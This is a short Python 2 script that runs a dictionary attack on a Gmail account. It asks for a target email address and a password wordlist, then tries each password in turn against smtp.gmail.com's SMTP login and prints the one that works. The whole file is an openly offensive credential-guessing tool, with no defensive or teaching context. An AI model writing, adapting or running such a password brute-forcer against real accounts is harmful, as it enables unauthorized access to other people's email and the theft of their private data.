import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter Target mail:")
passwfile = raw_input("Enter password file Name:")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)
		print"[+] password found %s" %password
		break;
	except smtplib.SMTPAuthenticationError:
		print"[!] password incorrect %s" %password

